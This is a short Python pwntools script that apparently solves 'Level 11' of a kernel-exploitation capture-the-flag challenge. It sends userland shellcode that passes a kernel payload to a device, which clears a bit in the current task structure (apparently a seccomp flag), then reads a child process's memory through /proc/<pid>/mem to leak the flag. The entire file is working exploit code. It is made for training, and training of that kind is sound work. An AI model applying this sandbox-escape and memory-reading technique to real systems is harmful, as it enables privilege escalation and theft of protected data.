# Level 11
import pwn
import pwnlib.util.proc
from dojotool import find_challenge
from dojotool.pwntool import tee


def one_round(io: pwn.process) -> None:
    io.recvuntil(b"from stdin.")
    children = pwnlib.util.proc.children(io.pid)

    shellcraft = pwn.shellcraft  # type: ...
    kshellcode = pwn.asm("""
mov rax, qword ptr gs:[0x15d00]
and qword ptr [rax], ~(1 << 8)
ret
""")
    ushellcode = [
        shellcraft.write(3, kshellcode, len(kshellcode)),
        shellcraft.open(f"/proc/{children[0]}/mem", 0),
        # cannot use sendfile, since mem is not spliceable
        shellcraft.pread("rax", 0x404040, 0x40, 0x404040),
        shellcraft.write(1, 0x404040, "rax"),
    ]
    ushellcode = pwn.asm("".join(ushellcode))
    io.send(ushellcode)


def ctf() -> None:
    root_bin = find_challenge()
    with pwn.process(root_bin, raw=True, level="error") as io:
        tee(io)
        one_round(io)
        io.recvrepeat()


if __name__ == "__main__":
    ctf()
